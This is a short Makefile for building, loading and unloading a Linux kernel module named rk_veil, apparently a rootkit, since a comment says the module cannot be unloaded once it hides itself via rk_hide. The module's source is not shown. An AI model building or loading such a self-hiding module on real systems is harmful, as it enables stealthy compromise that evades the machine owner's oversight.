obj-m += rk_veil.o
 
KDIR := /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)
 
all:
	make -C $(KDIR) M=$(PWD) modules
 
clean:
	make -C $(KDIR) M=$(PWD) clean
 
load:
	sudo insmod rk_veil.ko
 
unload:
	# Note: will fail if module is hidden (rk_hide called). Reboot to unload.
	sudo rmmod rk_veil
 
log:
	sudo dmesg | grep -E "rk-veil|rkveil" | tail -30